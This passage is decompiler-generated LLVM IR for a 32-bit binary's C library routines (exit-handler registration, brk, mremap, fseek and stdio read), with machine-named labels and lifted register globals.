  %v2_8058556 = load i32, i32* %v1_8058556, align 4
  %v9_8058558 = icmp eq i32 %v2_8058556, 2
  br i1 %v9_8058558, label %dec_label_pc_8058564, label %dec_label_pc_805855d

dec_label_pc_805855d:                             ; preds = %dec_label_pc_805854a
  %v9_805855d = icmp eq i32 %v2_8058556, 3
  %v1_8058560 = icmp eq i1 %v9_805855d, false
  br i1 %v1_8058560, label %dec_label_pc_8058585.backedge, label %dec_label_pc_8058573

dec_label_pc_8058585.backedge:                    ; preds = %dec_label_pc_805855d, %dec_label_pc_8058564, %dec_label_pc_8058573
  %v1_8058590 = icmp eq i32 %v1_805854a, 0
  %v1_8058592 = icmp eq i1 %v1_8058590, false
  br i1 %v1_8058592, label %dec_label_pc_805854a, label %dec_label_pc_8058585.dec_label_pc_8058594_crit_edge

dec_label_pc_8058564:                             ; preds = %dec_label_pc_805854a
  %v1_8058564 = add i32 %v2_8058553, 4
  %v2_8058564 = inttoptr i32 %v1_8058564 to i32*
  %v3_8058564 = load i32, i32* %v2_8058564, align 4
  %v1_8058567 = icmp eq i32 %v3_8058564, 0
  br i1 %v1_8058567, label %dec_label_pc_8058585.backedge, label %dec_label_pc_805856b

dec_label_pc_805856b:                             ; preds = %dec_label_pc_8058564
  br label %dec_label_pc_8058580

dec_label_pc_8058573:                             ; preds = %dec_label_pc_805855d
  %v1_8058573 = add i32 %v2_8058553, 4
  %v2_8058573 = inttoptr i32 %v1_8058573 to i32*
  %v3_8058573 = load i32, i32* %v2_8058573, align 4
  %v1_8058576 = icmp eq i32 %v3_8058573, 0
  br i1 %v1_8058576, label %dec_label_pc_8058585.backedge, label %dec_label_pc_805857a

dec_label_pc_805857a:                             ; preds = %dec_label_pc_8058573
  br label %dec_label_pc_8058580

dec_label_pc_8058580:                             ; preds = %dec_label_pc_805856b, %dec_label_pc_805857a
  %v4_8058580 = phi i32 [ %v3_8058573, %dec_label_pc_805857a ], [ %v3_8058564, %dec_label_pc_805856b ]
  call void @__pseudo_call(i32 %v4_8058580)
  %v0_805858517 = load i32, i32* @global_var_806779c.327, align 4
  %v0_805858a18 = load i32, i32* @global_var_80677a0.329, align 32
  %v1_805859019 = icmp eq i32 %v0_805858517, 0
  %v1_805859221 = icmp eq i1 %v1_805859019, false
  br i1 %v1_805859221, label %dec_label_pc_805854a.lr.ph, label %dec_label_pc_8058594

dec_label_pc_805854a.lr.ph:                       ; preds = %entry, %dec_label_pc_8058580
  %v0_805858a1832 = phi i32 [ %v0_805858a18, %dec_label_pc_8058580 ], [ %v0_805858a1826, %entry ]
  %v0_80585851731 = phi i32 [ %v0_805858517, %dec_label_pc_8058580 ], [ %v0_80585851725, %entry ]
  br label %dec_label_pc_805854a

dec_label_pc_8058585.dec_label_pc_8058594_crit_edge: ; preds = %dec_label_pc_8058585.backedge
  br label %dec_label_pc_8058594

dec_label_pc_8058594:                             ; preds = %entry, %dec_label_pc_8058580, %dec_label_pc_8058585.dec_label_pc_8058594_crit_edge
  %v0_805858a.lcssa = phi i32 [ %v0_805858a1832, %dec_label_pc_8058585.dec_label_pc_8058594_crit_edge ], [ %v0_805858a1826, %entry ], [ %v0_805858a18, %dec_label_pc_8058580 ]
  %v2_805859a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805859a, i32* @ebx, align 4
  %v1_805859b = call i32 @free(i32 %v0_805858a.lcssa)
  ret i32 %v1_805859b

; uselistorder directives
  uselistorder i32 %v2_8058553, { 1, 0, 2 }
  uselistorder i32 %v1_805854a, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8058594, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805854a.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_8058580, { 1, 0 }
  uselistorder label %dec_label_pc_8058585.backedge, { 2, 1, 0 }
}

define i32 @__new_exitfn() local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v2_80585ae = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_80585ae, i32* %stack_var_-44, align 4
  %v4_80585b3 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-20, i32 134541533, i32 ptrtoint (i32* @global_var_8062da0.263 to i32))
  store i32 ptrtoint (i32* @global_var_8062da0.263 to i32), i32* %stack_var_-44, align 4
  %v1_80585bf = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062da0.263 to i32))
  %v0_80585c4 = load i32, i32* @global_var_806779c.327, align 4
  %v0_80585cc = load i32, i32* @global_var_80677a4.330, align 4
  %v1_80585d2 = add i32 %v0_80585c4, 1
  %v5_80585d5 = icmp slt i32 %v0_80585cc, %v1_80585d2
  br i1 %v5_80585d5, label %dec_label_pc_80585d7, label %entry.dec_label_pc_8058610_crit_edge

entry.dec_label_pc_8058610_crit_edge:             ; preds = %entry
  %v1_8058625.pre = load i32, i32* @global_var_80677a0.329, align 32
  br label %dec_label_pc_8058610

dec_label_pc_80585d7:                             ; preds = %entry
  %v2_80585d7 = mul i32 %v0_80585cc, 16
  %v1_80585dc = add i32 %v2_80585d7, 320
  %v0_80585e3 = load i32, i32* @global_var_80677a0.329, align 32
  store i32 %v0_80585e3, i32* %stack_var_-44, align 4
  %v4_80585e9 = inttoptr i32 %v0_80585e3 to i32*
  %v5_80585e9 = call i32 @realloc(i32* %v4_80585e9, i32 %v1_80585dc, i32 %v1_80585d2, i32 %v1_80585d2)
  %v1_80585f1 = icmp eq i32 %v5_80585e9, 0
  store i32 %v5_80585e9, i32* @ebx, align 4
  %v1_80585f5 = icmp eq i1 %v1_80585f1, false
  br i1 %v1_80585f5, label %dec_label_pc_8058604, label %dec_label_pc_80585f7

dec_label_pc_80585f7:                             ; preds = %dec_label_pc_80585d7
  %v0_80585f7 = load i32, i32* %stack_var_-44, align 4
  %v1_80585f7 = call i32 @__errno_location(i32 %v0_80585f7)
  %v1_80585fc = inttoptr i32 %v1_80585f7 to i32*
  store i32 12, i32* %v1_80585fc, align 4
  br label %dec_label_pc_8058636

dec_label_pc_8058604:                             ; preds = %dec_label_pc_80585d7
  %v0_8058604 = load i32, i32* @global_var_80677a4.330, align 4
  %v1_8058604 = add i32 %v0_8058604, 20
  store i32 %v1_8058604, i32* @global_var_80677a4.330, align 4
  store i32 %v5_80585e9, i32* @global_var_80677a0.329, align 32
  %v0_8058610.pre = load i32, i32* @global_var_806779c.327, align 4
  br label %dec_label_pc_8058610

dec_label_pc_8058610:                             ; preds = %entry.dec_label_pc_8058610_crit_edge, %dec_label_pc_8058604
  %v1_8058625 = phi i32 [ %v1_8058625.pre, %entry.dec_label_pc_8058610_crit_edge ], [ %v5_80585e9, %dec_label_pc_8058604 ]
  %v0_8058610 = phi i32 [ %v0_80585c4, %entry.dec_label_pc_8058610_crit_edge ], [ %v0_8058610.pre, %dec_label_pc_8058604 ]
  store i32 134579520, i32* @global_var_8067644.264, align 4
  %v1_8058621 = add i32 %v0_8058610, 1
  %v2_8058622 = mul i32 %v0_8058610, 16
  %v2_8058625 = add i32 %v2_8058622, %v1_8058625
  store i32 %v2_8058625, i32* @ebx, align 4
  store i32 %v1_8058621, i32* @global_var_806779c.327, align 4
  %v1_8058630 = inttoptr i32 %v2_8058625 to i32*
  store i32 1, i32* %v1_8058630, align 4
  br label %dec_label_pc_8058636

dec_label_pc_8058636:                             ; preds = %dec_label_pc_80585f7, %dec_label_pc_8058610
  store i32 %v2_80585ae, i32* %stack_var_-44, align 4
  %v3_805863f = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-20, i32 1)
  %v0_8058647 = load i32, i32* @ebx, align 4
  ret i32 %v0_8058647

; uselistorder directives
  uselistorder i32 %v5_80585e9, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2, 3, 4 }
  uselistorder i32 (i32*, i32, i32, i32)* @realloc, { 1, 0 }
  uselistorder i32 320, { 1, 0 }
  uselistorder i32* @global_var_80677a0.329, { 3, 4, 2, 1, 0 }
  uselistorder i32* @global_var_806779c.327, { 3, 2, 4, 1, 5, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8062da0.263 to i32), { 2, 4, 0, 3, 1 }
  uselistorder label %dec_label_pc_8058636, { 1, 0 }
  uselistorder label %dec_label_pc_8058610, { 1, 0 }
}

define i32 @_dl_aux_init() local_unnamed_addr {
entry:
  %v0_805864c = load i32, i32* @eax, align 4
  %v1_805864c = add i32 %v0_805864c, 28
  %v2_805864c = inttoptr i32 %v1_805864c to i32*
  %v3_805864c = load i32, i32* %v2_805864c, align 4
  store i32 %v3_805864c, i32* @global_var_8067f00.331, align 256
  %v1_8058655 = add i32 %v0_805864c, 44
  %v2_8058655 = inttoptr i32 %v1_8058655 to i32*
  %v3_8058655 = load i32, i32* %v2_8058655, align 4
  store i32 %v3_8058655, i32* @global_var_8067f04.332, align 4
  ret i32 %v3_8058655
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8058660 = load i32, i32* @ebx, align 4
  store i32 %v0_8058660, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_8058673 = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8058673, i32* @global_var_80677a8.285, align 8
  %v7_805867e = icmp ult i32 %v1_8058673, %arg1
  %v1_8058680 = icmp eq i1 %v7_805867e, false
  br i1 %v1_8058680, label %dec_label_pc_8058690, label %dec_label_pc_8058682

dec_label_pc_8058682:                             ; preds = %entry
  %v0_8058682 = load i32, i32* %stack_var_-4, align 4
  %v1_8058682 = call i32 @__errno_location(i32 %v0_8058682)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_805868a = inttoptr i32 %v1_8058682 to i32*
  store i32 12, i32* %v1_805868a, align 4
  %v0_8058691.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8058690

dec_label_pc_8058690:                             ; preds = %entry, %dec_label_pc_8058682
  %v0_8058691 = phi i32 [ 0, %entry ], [ %v0_8058691.pre, %dec_label_pc_8058682 ]
  %v2_8058694 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8058694, i32* @ebx, align 4
  ret i32 %v0_8058691

; uselistorder directives
  uselistorder i32 %v1_8058673, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32* @global_var_80677a8.285, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8058690, { 1, 0 }
}

define i32 @__cmsg_nxthdr() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* @edx, align 4
  %v1_80586a1 = inttoptr i32 %tmp2 to i32*
  %v2_80586a1 = load i32, i32* %v1_80586a1, align 4
  %tmp5 = icmp ult i32 %v2_80586a1, 12
  br i1 %tmp5, label %dec_label_pc_80586cd, label %dec_label_pc_80586a8

dec_label_pc_80586a8:                             ; preds = %entry
  %v1_80586a8 = add i32 %v2_80586a1, 3
  %v1_80586ab = and i32 %v1_80586a8, -4
  %v2_80586ae = add i32 %v1_80586ab, %tmp2
  %v1_80586b1 = add i32 %tmp, 20
  %v2_80586b1 = inttoptr i32 %v1_80586b1 to i32*
  %v3_80586b1 = load i32, i32* %v2_80586b1, align 4
  %v2_80586b4 = add i32 %tmp, 16
  %v3_80586b4 = inttoptr i32 %v2_80586b4 to i32*
  %v4_80586b4 = load i32, i32* %v3_80586b4, align 4
  %v5_80586b4 = add i32 %v4_80586b4, %v3_80586b1
  store i32 %v5_80586b4, i32* @edx, align 4
  %v1_80586b7 = add i32 %v2_80586ae, 12
  %v6_80586bc = icmp ugt i32 %v1_80586b7, %v5_80586b4
  br i1 %v6_80586bc, label %dec_label_pc_80586cd, label %dec_label_pc_80586be

dec_label_pc_80586be:                             ; preds = %dec_label_pc_80586a8
  %v1_80586be = inttoptr i32 %v2_80586ae to i32*
  %v2_80586be = load i32, i32* %v1_80586be, align 4
  %v1_80586c0 = add i32 %v2_80586be, 3
  %v1_80586c3 = and i32 %v1_80586c0, -4
  %v2_80586c6 = add i32 %v1_80586c3, %v2_80586ae
  %tmp6 = icmp ugt i32 %v2_80586c6, %v5_80586b4
  br i1 %tmp6, label %dec_label_pc_80586cd, label %dec_label_pc_80586cf

dec_label_pc_80586cd:                             ; preds = %dec_label_pc_80586be, %dec_label_pc_80586a8, %entry
  br label %dec_label_pc_80586cf

dec_label_pc_80586cf:                             ; preds = %dec_label_pc_80586be, %dec_label_pc_80586cd
  %v0_80586d0 = phi i32 [ %v2_80586ae, %dec_label_pc_80586be ], [ 0, %dec_label_pc_80586cd ]
  ret i32 %v0_80586d0

; uselistorder directives
  uselistorder i32 %v2_80586ae, { 1, 0, 2, 3 }
  uselistorder i32 %v2_80586a1, { 1, 0 }
  uselistorder i32 %tmp2, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_80586cf, { 1, 0 }
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_80586d4 = load i32, i32* @edi, align 4
  %v0_80586d5 = load i32, i32* @esi, align 4
  store i32 %v0_80586d5, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_80586ed = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v6_80586f5 = call i32 @mremap(i32 %v0_80586ed, i32 %v0_80586d5, i32 %v0_80586d4, i32 %tmp6, i32 %arg1, i32 %arg2)
  store i32 %v0_80586ed, i32* @ebx, align 4
  store i32 %v6_80586f5, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v6_80586f5, -4095
  br i1 %tmp, label %dec_label_pc_805870d, label %dec_label_pc_8058701

dec_label_pc_8058701:                             ; preds = %entry
  %v1_8058701 = call i32 @__errno_location(i32 %v0_80586ed)
  %v0_8058706 = load i32, i32* %esi.global-to-local, align 4
  %v1_8058706 = sub i32 0, %v0_8058706
  %v2_8058708 = inttoptr i32 %v1_8058701 to i32*
  store i32 %v1_8058706, i32* %v2_8058708, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805870d

dec_label_pc_805870d:                             ; preds = %entry, %dec_label_pc_8058701
  %v0_805870e = phi i32 [ %v6_80586f5, %entry ], [ -1, %dec_label_pc_8058701 ]
  %v2_8058710 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8058710, i32* @esi, align 4
  store i32 %v0_80586d4, i32* @edi, align 4
  ret i32 %v0_805870e

; uselistorder directives
  uselistorder i32 %v6_80586f5, { 1, 0, 2 }
  uselistorder i32 %v0_80586ed, { 1, 0, 2 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 46, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mremap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805870d, { 1, 0 }
}

define i32 @__GI_fseek(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_805871f = ashr i32 %arg2, 31
  %v4_8058726 = inttoptr i32 %arg1 to i16*
  %v5_8058726 = call i32 @__GI_fseeko64(i16* %v4_8058726, i32 %arg2, i32 %v1_805871f, i32 %arg3)
  ret i32 %v5_8058726
}

declare i32 @printf(i8*, ...) local_unnamed_addr

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8058750 = load i32, i32* @ebp, align 4
  %v0_8058751 = load i32, i32* @edi, align 4
  %v0_8058752 = load i32, i32* @esi, align 4
  %v0_8058753 = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_8058763 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8058763, i32* @esi, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  %tmp = icmp ult i32 %arg4, 3
  br i1 %tmp, label %dec_label_pc_8058787, label %dec_label_pc_8058774

dec_label_pc_8058774:                             ; preds = %entry
  %v1_8058774 = call i32 @__errno_location(i32 %arg2)
  store i32 %v1_8058774, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @ebx, align 4
  %v1_805877c = inttoptr i32 %v1_8058774 to i32*
  store i32 22, i32* %v1_805877c, align 4
  br label %dec_label_pc_805882d

dec_label_pc_8058787:                             ; preds = %entry
  %v1_8058787 = add i32 %v4_8058763, 52
  %v2_8058787 = inttoptr i32 %v1_8058787 to i32*
  %v3_8058787 = load i32, i32* %v2_8058787, align 4
  store i32 %v3_8058787, i32* @ebp, align 4
  %v1_805878a = icmp eq i32 %v3_8058787, 0
  %v1_805878c = icmp eq i1 %v1_805878a, false
  br i1 %v1_805878c, label %dec_label_pc_80587ad, label %dec_label_pc_805878e

dec_label_pc_805878e:                             ; preds = %dec_label_pc_8058787
  %v1_805878e = add i32 %v4_8058763, 56
  store i32 %v1_805878e, i32* @ebx, align 4
  %v2_8058798 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8058798, i32* %eax.global-to-local, align 4
  %v5_805879d = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-44, i32 134541533, i32 %v1_805878e)
  store i32 %v5_805879d, i32* %eax.global-to-local, align 4
  %v0_80587a2 = load i32, i32* @ebx, align 4
  %v2_80587a5 = call i32 @pthread_mutex_lock(i32 %v0_80587a2)
  store i32 %v2_80587a5, i32* %eax.global-to-local, align 4
  %v0_80587ad.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80587ad

dec_label_pc_80587ad:                             ; preds = %dec_label_pc_8058787, %dec_label_pc_805878e
  %v0_80587b5 = phi i32 [ %v4_8058763, %dec_label_pc_8058787 ], [ %v0_80587ad.pre, %dec_label_pc_805878e ]
  %v1_80587ad = inttoptr i32 %v0_80587b5 to i8*
  %v2_80587ad = load i8, i8* %v1_80587ad, align 1
  %v3_80587ad = and i8 %v2_80587ad, 64
  %v4_80587ad = icmp eq i8 %v3_80587ad, 0
  br i1 %v4_80587ad, label %dec_label_pc_80587c2, label %dec_label_pc_80587b2

dec_label_pc_80587b2:                             ; preds = %dec_label_pc_80587ad
  %v2_80587b6 = call i32 @__stdio_wcommit(i32 %v0_80587b5)
  store i32 %v2_80587b6, i32* %eax.global-to-local, align 4
  %v1_80587be = icmp eq i32 %v2_80587b6, 0
  %v1_80587c0 = icmp eq i1 %v1_80587be, false
  br i1 %v1_80587c0, label %dec_label_pc_8058815, label %dec_label_pc_80587c2

dec_label_pc_80587c2:                             ; preds = %dec_label_pc_80587b2, %dec_label_pc_80587ad
  %v0_80587c2 = load i32, i32* @edi, align 4
  %v9_80587c2 = icmp eq i32 %v0_80587c2, 1
  %v1_80587c5 = icmp eq i1 %v9_80587c2, false
  br i1 %v1_80587c5, label %dec_label_pc_80587c2.dec_label_pc_80587db_crit_edge, label %dec_label_pc_80587c7

dec_label_pc_80587c2.dec_label_pc_80587db_crit_edge: ; preds = %dec_label_pc_80587c2
  %.pre6 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_80587db

dec_label_pc_80587c7:                             ; preds = %dec_label_pc_80587c2
  %v0_80587c7 = load i32, i32* @ecx, align 4
  %v2_80587c9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_80587c9, i32* %eax.global-to-local, align 4
  %v0_80587ce = load i32, i32* @esi, align 4
  %v5_80587ce = inttoptr i32 %v0_80587ce to i16*
  %v6_80587cf = call i32 @__stdio_adjust_position(i16* %v5_80587ce, i32 %v2_80587c9, i32 %v0_80587c7, i32 %v0_80587c7)
  store i32 %v6_80587cf, i32* %eax.global-to-local, align 4
  %v2_80587d7 = icmp slt i32 %v6_80587cf, 0
  br i1 %v2_80587d7, label %dec_label_pc_8058815, label %dec_label_pc_80587c7.dec_label_pc_80587db_crit_edge

dec_label_pc_80587c7.dec_label_pc_80587db_crit_edge: ; preds = %dec_label_pc_80587c7
  %v0_80587dc.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80587db

dec_label_pc_80587db:                             ; preds = %dec_label_pc_80587c2.dec_label_pc_80587db_crit_edge, %dec_label_pc_80587c7.dec_label_pc_80587db_crit_edge
  %v2_80587dd.pre-phi = phi i32 [ %.pre6, %dec_label_pc_80587c2.dec_label_pc_80587db_crit_edge ], [ %v2_80587c9, %dec_label_pc_80587c7.dec_label_pc_80587db_crit_edge ]
  %v0_80587dc = phi i32 [ %v0_80587c2, %dec_label_pc_80587c2.dec_label_pc_80587db_crit_edge ], [ %v0_80587dc.pre, %dec_label_pc_80587c7.dec_label_pc_80587db_crit_edge ]
  %v0_80587db = load i32, i32* @edx, align 4
  store i32 %v2_80587dd.pre-phi, i32* %eax.global-to-local, align 4
  %v0_80587e2 = load i32, i32* @esi, align 4
  %v5_80587e3 = inttoptr i32 %v2_80587dd.pre-phi to i32*
  %v6_80587e3 = call i32 @__stdio_seek(i32 %v0_80587e2, i32* %v5_80587e3, i32 %v0_80587dc, i32 %v0_80587db)
  store i32 %v6_80587e3, i32* %eax.global-to-local, align 4
  %v2_80587eb = icmp slt i32 %v6_80587e3, 0
  br i1 %v2_80587eb, label %dec_label_pc_8058815, label %dec_label_pc_80587ef

dec_label_pc_80587ef:                             ; preds = %dec_label_pc_80587db
  %v0_80587ef = load i32, i32* @esi, align 4
  %v1_80587ef = inttoptr i32 %v0_80587ef to i32*
  %v2_80587ef = load i32, i32* %v1_80587ef, align 4
  store i32 %v2_80587ef, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_80587f3 = add i32 %v0_80587ef, 44
  %v2_80587f3 = inttoptr i32 %v1_80587f3 to i32*
  store i32 0, i32* %v2_80587f3, align 4
  %v0_80587fa = load i32, i32* @esi, align 4
  %v1_80587fa = add i32 %v0_80587fa, 2
  %v2_80587fa = inttoptr i32 %v1_80587fa to i8*
  store i8 0, i8* %v2_80587fa, align 1
  %v0_80587fe = load i32, i32* %eax.global-to-local, align 4
  %v1_80587fe = and i32 %v0_80587fe, -72
  store i32 %v1_80587fe, i32* %eax.global-to-local, align 4
  %v1_8058801 = trunc i32 %v1_80587fe to i16
  %v2_8058801 = load i32, i32* @esi, align 4
  %v3_8058801 = inttoptr i32 %v2_8058801 to i16*
  store i16 %v1_8058801, i16* %v3_8058801, align 2
  %v0_8058804 = load i32, i32* @esi, align 4
  %v1_8058804 = add i32 %v0_8058804, 8
  %v2_8058804 = inttoptr i32 %v1_8058804 to i32*
  %v3_8058804 = load i32, i32* %v2_8058804, align 4
  store i32 %v3_8058804, i32* %eax.global-to-local, align 4
  %v2_8058807 = add i32 %v0_8058804, 16
  %v3_8058807 = inttoptr i32 %v2_8058807 to i32*
  store i32 %v3_8058804, i32* %v3_8058807, align 4
  %v0_805880a = load i32, i32* %eax.global-to-local, align 4
  %v1_805880a = load i32, i32* @esi, align 4
  %v2_805880a = add i32 %v1_805880a, 20
  %v3_805880a = inttoptr i32 %v2_805880a to i32*
  store i32 %v0_805880a, i32* %v3_805880a, align 4
  %v0_805880d = load i32, i32* %eax.global-to-local, align 4
  %v1_805880d = load i32, i32* @esi, align 4
  %v2_805880d = add i32 %v1_805880d, 24
  %v3_805880d = inttoptr i32 %v2_805880d to i32*
  store i32 %v0_805880d, i32* %v3_805880d, align 4
  %v0_8058810 = load i32, i32* %eax.global-to-local, align 4
  %v1_8058810 = load i32, i32* @esi, align 4
  %v2_8058810 = add i32 %v1_8058810, 28
  %v3_8058810 = inttoptr i32 %v2_8058810 to i32*
  store i32 %v0_8058810, i32* %v3_8058810, align 4
  br label %dec_label_pc_8058818

dec_label_pc_8058815:                             ; preds = %dec_label_pc_80587db, %dec_label_pc_80587c7, %dec_label_pc_80587b2
  store i32 -1, i32* @ebx, align 4
  br label %dec_label_pc_8058818

dec_label_pc_8058818:                             ; preds = %dec_label_pc_80587ef, %dec_label_pc_8058815
  br i1 %v1_805878c, label %dec_label_pc_805882d, label %dec_label_pc_805881c

dec_label_pc_805881c:                             ; preds = %dec_label_pc_8058818
  %v2_8058820 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8058820, i32* %eax.global-to-local, align 4
  %v4_8058825 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-44, i32 1)
  store i32 %v4_8058825, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805882d

dec_label_pc_805882d:                             ; preds = %dec_label_pc_8058818, %dec_label_pc_8058774, %dec_label_pc_805881c
  %v0_8058830 = load i32, i32* @ebx, align 4
  store i32 %v0_8058830, i32* %eax.global-to-local, align 4
  store i32 %v0_8058753, i32* @ebx, align 4
  store i32 %v0_8058752, i32* @esi, align 4
  store i32 %v0_8058751, i32* @edi, align 4
  store i32 %v0_8058750, i32* @ebp, align 4
  ret i32 %v0_8058830

; uselistorder directives
  uselistorder i32 %v2_80587dd.pre-phi, { 1, 0 }
  uselistorder i32 %v0_80587c2, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-28, { 2, 0, 1 }
  uselistorder i8 64, { 6, 2, 3, 7, 4, 5, 0, 8, 1 }
  uselistorder i32 22, { 39, 24, 41, 23, 25, 26, 27, 30, 45, 31, 36, 38, 40, 37, 34, 35, 46, 21, 1, 2, 3, 42, 4, 5, 6, 0, 7, 8, 9, 10, 11, 12, 28, 13, 44, 14, 15, 29, 16, 22, 17, 18, 19, 20, 43, 32, 33 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805882d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8058818, { 1, 0 }
  uselistorder label %dec_label_pc_80587db, { 1, 0 }
  uselistorder label %dec_label_pc_80587ad, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8058838 = load i32, i32* @ebx, align 4
  store i32 %v0_8058838, i32* %stack_var_-4, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v4_805883e = ptrtoint i16* %arg1 to i32
  store i32 %v4_805883e, i32* @ebx, align 4
  %v1_8058846 = bitcast i16* %arg1 to i8*
  %v2_8058846 = load i8, i8* %v1_8058846, align 1
  %v3_8058846 = and i8 %v2_8058846, 4
  %v4_8058846 = icmp eq i8 %v3_8058846, 0
  %v1_8058849 = icmp eq i1 %v4_8058846, false
  br i1 %v1_8058849, label %dec_label_pc_8058881, label %dec_label_pc_805884b

dec_label_pc_805884b:                             ; preds = %entry
  %v2_805884b = icmp slt i32 %arg3, 0
  %v3_8058852 = select i1 %v2_805884b, i32 2147483647, i32 %arg3
  %v1_805885b = add i32 %v4_805883e, 4
  %v2_805885b = inttoptr i32 %v1_805885b to i32*
  %v3_805885b = load i32, i32* %v2_805885b, align 4
  %v3_805885e = call i32 @__libc_read(i32 %v3_805885b, i32 %arg2, i32 %v3_8058852)
  store i32 %v3_805885e, i32* %ecx.global-to-local, align 4
  %tmp12 = icmp slt i32 %v3_805885e, 1
  %tmp13 = icmp eq i1 %tmp12, false
  br i1 %tmp13, label %dec_label_pc_8058881, label %dec_label_pc_805886d

dec_label_pc_805886d:                             ; preds = %dec_label_pc_805884b
  %v1_8058866 = icmp eq i32 %v3_805885e, 0
  %v4_805886b = icmp eq i1 %v1_8058866, false
  %v0_805886d = load i32, i32* @ebx, align 4
  %v1_805886d = inttoptr i32 %v0_805886d to i32*
  %v2_805886d = load i32, i32* %v1_805886d, align 4
  br i1 %v4_805886b, label %dec_label_pc_8058879, label %dec_label_pc_8058871

dec_label_pc_8058871:                             ; preds = %dec_label_pc_805886d
  %v1_8058871 = or i32 %v2_805886d, 4
  %v1_8058874 = trunc i32 %v1_8058871 to i16
  %v3_8058874 = inttoptr i32 %v0_805886d to i16*
  store i16 %v1_8058874, i16* %v3_8058874, align 2
  br label %dec_label_pc_8058881

dec_label_pc_8058879:                             ; preds = %dec_label_pc_805886d
  %v1_8058879 = or i32 %v2_805886d, 8
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_805887e = trunc i32 %v1_8058879 to i16
  %v3_805887e = inttoptr i32 %v0_805886d to i16*
  store i16 %v1_805887e, i16* %v3_805887e, align 2
  br label %dec_label_pc_8058881

dec_label_pc_8058881:                             ; preds = %dec_label_pc_805884b, %entry, %dec_label_pc_8058871, %dec_label_pc_8058879
  %v0_8058882 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8058885 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8058885, i32* @ebx, align 4
  ret i32 %v0_8058882

; uselistorder directives
  uselistorder i32 %v3_805885e, { 2, 0, 1 }
  uselistorder i32* %ecx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @__libc_read, { 1, 4, 3, 5, 2, 0 }
